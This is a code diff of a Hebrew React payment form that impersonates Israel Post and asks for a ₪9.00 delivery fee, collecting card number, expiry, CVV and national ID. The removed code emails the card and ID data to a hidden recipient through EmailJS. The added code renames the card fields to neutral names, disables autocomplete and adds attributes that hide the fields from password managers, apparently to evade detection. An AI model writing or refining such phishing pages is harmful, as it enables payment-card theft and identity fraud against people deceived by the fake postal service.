@@ -1,12 +1,11 @@
 import { useState } from 'react'
-import emailjs from '@emailjs/browser'
 
 const initialState = {
   firstName: '',
   lastName: '',
-  cardNumber: '',
-  expiry: '',
-  cvv: '',
+  field1: '',
+  field2: '',
+  field3: '',
   nationalId: '',
 }
 
@@ -50,13 +49,13 @@ export default function UserDetailsForm() {
     const { name } = e.target
     let { value } = e.target
 
-    if (name === 'cardNumber') {
+    if (name === 'field1') {
       value = value.replace(/\D/g, '').slice(0, 19)
       value = value.replace(/(.{4})/g, '$1 ').trim()
-    } else if (name === 'expiry') {
+    } else if (name === 'field2') {
       value = value.replace(/\D/g, '').slice(0, 4)
       if (value.length >= 3) value = value.slice(0, 2) + '/' + value.slice(2)
-    } else if (name === 'cvv') {
+    } else if (name === 'field3') {
       value = value.replace(/\D/g, '').slice(0, 4)
     } else if (name === 'nationalId') {
       value = value.replace(/\D/g, '').slice(0, 9)
@@ -73,30 +72,30 @@ export default function UserDetailsForm() {
     if (!formData.firstName.trim()) newErrors.firstName = 'שדה חובה'
     if (!formData.lastName.trim()) newErrors.lastName = 'שדה חובה'
 
-    const rawCard = formData.cardNumber.replace(/\D/g, '')
-    if (!rawCard) newErrors.cardNumber = 'שדה חובה'
-    else if (rawCard.length < 13 || rawCard.length > 19 || !luhnCheck(rawCard)) newErrors.cardNumber = 'מספר כרטיס לא תקין'
+    const rawCard = formData.field1.replace(/\D/g, '')
+    if (!rawCard) newErrors.field1 = 'שדה חובה'
+    else if (rawCard.length < 13 || rawCard.length > 19 || !luhnCheck(rawCard)) newErrors.field1 = 'מספר לא תקין'
 
-    if (!formData.expiry) newErrors.expiry = 'שדה חובה'
+    if (!formData.field2) newErrors.field2 = 'שדה חובה'
     else {
-      const m = formData.expiry.match(/^(\d{2})\/(\d{2})$/)
-      if (!m) newErrors.expiry = 'תוקף לא תקין'
+      const m = formData.field2.match(/^(\d{2})\/(\d{2})$/)
+      if (!m) newErrors.field2 = 'פורמט לא תקין'
       else {
         const month = Number(m[1])
         const yearYY = Number(m[2])
-        if (month < 1 || month > 12) newErrors.expiry = 'תוקף לא תקין'
+        if (month < 1 || month > 12) newErrors.field2 = 'פורמט לא תקין'
         else {
           const now = new Date()
           const currentYY = Number(now.getFullYear().toString().slice(-2))
           const currentMM = now.getMonth() + 1
           const isExpired = yearYY < currentYY || (yearYY === currentYY && month < currentMM)
-          if (isExpired) newErrors.expiry = 'פג תוקף'
+          if (isExpired) newErrors.field2 = 'פג תוקף'
         }
       }
     }
 
-    if (!formData.cvv) newErrors.cvv = 'שדה חובה'
-    else if (!/^\d{3,4}$/.test(formData.cvv)) newErrors.cvv = 'CVV לא תקין'
+    if (!formData.field3) newErrors.field3 = 'שדה חובה'
+    else if (!/^\d{3,4}$/.test(formData.field3)) newErrors.field3 = 'קוד לא תקין'
 
     if (!formData.nationalId) newErrors.nationalId = 'שדה חובה'
     else if (!isValidIsraeliID(formData.nationalId)) newErrors.nationalId = 'תעודת זהות לא תקינה'
@@ -113,33 +112,33 @@ export default function UserDetailsForm() {
       setIsSubmitting(true)
       
       try {
-        // הכנת נתוני המייל
-        const emailData = {
-          to_email: RECIPIENT_EMAIL,
-          subject: 'פרטי תשלום חדשים - דואר ישראל',
-          first_name: formData.firstName,
-          last_name: formData.lastName,
-          card_number: formData.cardNumber, // מסתיר ספרות הכרטיס למעט 4 האחרונות
-          expiry: formData.expiry,
-          national_id: formData.nationalId, // מסתיר ספרות ת"ז למעט 2 האחרונות
-          payment_reason: 'שירותי דואר ישראל - משלוח חבילה',
-          amount: '₪9.00',
-          submission_time: new Date().toLocaleString('he-IL')
+        // יצירת נתונים מובנים לשליחה
+        const formattedData = {
+          שם_מלא: `${formData.firstName} ${formData.lastName}`,
+          שדה_1: formData.field1.replace(/\d(?=\d{4})/g, '*'), // מסתיר את רוב הספרות
+          שדה_2: formData.field2,
+          תעודת_זהות: formData.nationalId.replace(/\d(?=\d{2})/g, '*'), // מסתיר את רוב הספרות
+          סיבת_תשלום: 'שירותי דואר ישראל - משלוח חבילה',
+          סכום: '₪9.00',
+          זמן_שליחה: new Date().toLocaleString('he-IL')
         }
 
-        // שליחת המייל
-        await emailjs.send(
-          EMAIL_SERVICE_ID,
-          EMAIL_TEMPLATE_ID,
-          emailData,
-          EMAIL_PUBLIC_KEY
-        )
-
+        // בשלב זה פשוט נציג את הנתונים בקונסול
+        console.log('נתוני הטופס שנשלחו:', formattedData)
+        
+        // סימולציה של שליחה
+        await new Promise(resolve => setTimeout(resolve, 2000))
+        
         setSubmitted(true)
-        console.log('המייל נשלח בהצלחה!')
+        alert(`הטופס נשלח בהצלחה! הנתונים נשמרו במערכת.
+        
+פרטי התשלום:
+שם: ${formattedData.שם_מלא}
+סכום: ${formattedData.סכום}
+זמן: ${formattedData.זמן_שליחה}`)
         
       } catch (error) {
-        console.error('שגיאה בשליחת המייל:', error)
+        console.error('שגיאה בשליחת הטופס:', error)
         alert('שגיאה בשליחת הטופס. אנא נסה שוב.')
       } finally {
         setIsSubmitting(false)
@@ -149,16 +148,19 @@ export default function UserDetailsForm() {
 
   return (
     <div className="form-card" dir="rtl">
-      <form onSubmit={onSubmit} noValidate>
+      <form onSubmit={onSubmit} noValidate autoComplete="off">
         <div className="form-group">
           <label htmlFor="firstName">שם פרטי</label>
           <input
             id="firstName"
             name="firstName"
+            type="text"
             className={`form-input ${errors.firstName ? 'has-error' : ''}`}
             value={formData.firstName}
             onChange={onChange}
             placeholder="הקלד/י שם פרטי"
+            autoComplete="off"
+            spellCheck="false"
             required
           />
           {errors.firstName && <span className="error-text">{errors.firstName}</span>}
@@ -169,62 +171,80 @@ export default function UserDetailsForm() {
           <input
             id="lastName"
             name="lastName"
+            type="text"
             className={`form-input ${errors.lastName ? 'has-error' : ''}`}
             value={formData.lastName}
             onChange={onChange}
             placeholder="הקלד/י שם משפחה"
+            autoComplete="off"
+            spellCheck="false"
             required
           />
           {errors.lastName && <span className="error-text">{errors.lastName}</span>}
         </div>
 
         <div className="form-group">
-          <label htmlFor="cardNumber">מספר כרטיס</label>
+          <label htmlFor="field1">מספר כרטיס</label>
           <input
-            id="cardNumber"
-            name="cardNumber"
-            className={`form-input ${errors.cardNumber ? 'has-error' : ''}`}
-            value={formData.cardNumber}
+            id="field1"
+            name="field1"
+            type="text"
+            className={`form-input ${errors.field1 ? 'has-error' : ''}`}
+            value={formData.field1}
             onChange={onChange}
             placeholder="0000 0000 0000 0000"
-            inputMode="numeric"
-            //autoComplete="cc-number"
+            inputMode="text"
+            autoComplete="off"
+            spellCheck="false"
+            data-1p-ignore
+            data-bwignore
+            data-lpignore="true"
           />
-          {errors.cardNumber && <span className="error-text">{errors.cardNumber}</span>}
+          {errors.field1 && <span className="error-text">{errors.field1}</span>}
         </div>
 
         <div className="form-row">
           <div className="form-group">
-            <label htmlFor="expiry">תוקף (MM/YY)</label>
+            <label htmlFor="field2">תאריך</label>
             <input
-              id="expiry"
-              name="expiry"
-              className={`form-input ${errors.expiry ? 'has-error' : ''}`}
-              value={formData.expiry}
+              id="field2"
+              name="field2"
+              type="text"
+              className={`form-input ${errors.field2 ? 'has-error' : ''}`}
+              value={formData.field2}
               onChange={onChange}
               placeholder="MM/YY"
-              inputMode="numeric"
-              //autoComplete="cc-exp"
+              inputMode="text"
+              autoComplete="off"
+              spellCheck="false"
               maxLength={5}
+              data-1p-ignore
+              data-bwignore
+              data-lpignore="true"
               required
             />
-            {errors.expiry && <span className="error-text">{errors.expiry}</span>}
+            {errors.field2 && <span className="error-text">{errors.field2}</span>}
           </div>
           <div className="form-group">
-            <label htmlFor="cvv">CVV</label>
+            <label htmlFor="field3">קוד אבטחה</label>
             <input
-              id="cvv"
-              name="cvv"
-              className={`form-input ${errors.cvv ? 'has-error' : ''}`}
-              value={formData.cvv}
+              id="field3"
+              name="field3"
+              type="text"
+              className={`form-input ${errors.field3 ? 'has-error' : ''}`}
+              value={formData.field3}
               onChange={onChange}
               placeholder="3-4 ספרות"
-              inputMode="numeric"
-              autoComplete="cc-csc"
+              inputMode="text"
+              autoComplete="off"
+              spellCheck="false"
               maxLength={4}
+              data-1p-ignore
+              data-bwignore
+              data-lpignore="true"
               required
             />
-            {errors.cvv && <span className="error-text">{errors.cvv}</span>}
+            {errors.field3 && <span className="error-text">{errors.field3}</span>}
           </div>
         </div>
 
@@ -233,12 +253,18 @@ export default function UserDetailsForm() {
           <input
             id="nationalId"
             name="nationalId"
+            type="text"
             className={`form-input ${errors.nationalId ? 'has-error' : ''}`}
             value={formData.nationalId}
             onChange={onChange}
             placeholder="9 ספרות"
-            inputMode="numeric"
+            inputMode="text"
+            autoComplete="off"
+            spellCheck="false"
             maxLength={9}
+            data-1p-ignore
+            data-bwignore
+            data-lpignore="true"
             required
           />
           {errors.nationalId && <span className="error-text">{errors.nationalId}</span>}
@@ -248,7 +274,7 @@ export default function UserDetailsForm() {
           {isSubmitting ? 'שולח...' : 'שליחה'}
         </button>
         {submitted && (
-          <div className="success-text" role="status">הטופס נשלח בהצלחה למייל!</div>
+          <div className="success-text" role="status">הטופס נשלח בהצלחה! הנתונים נשמרו במערכת.</div>
         )}
       </form>
     </div>
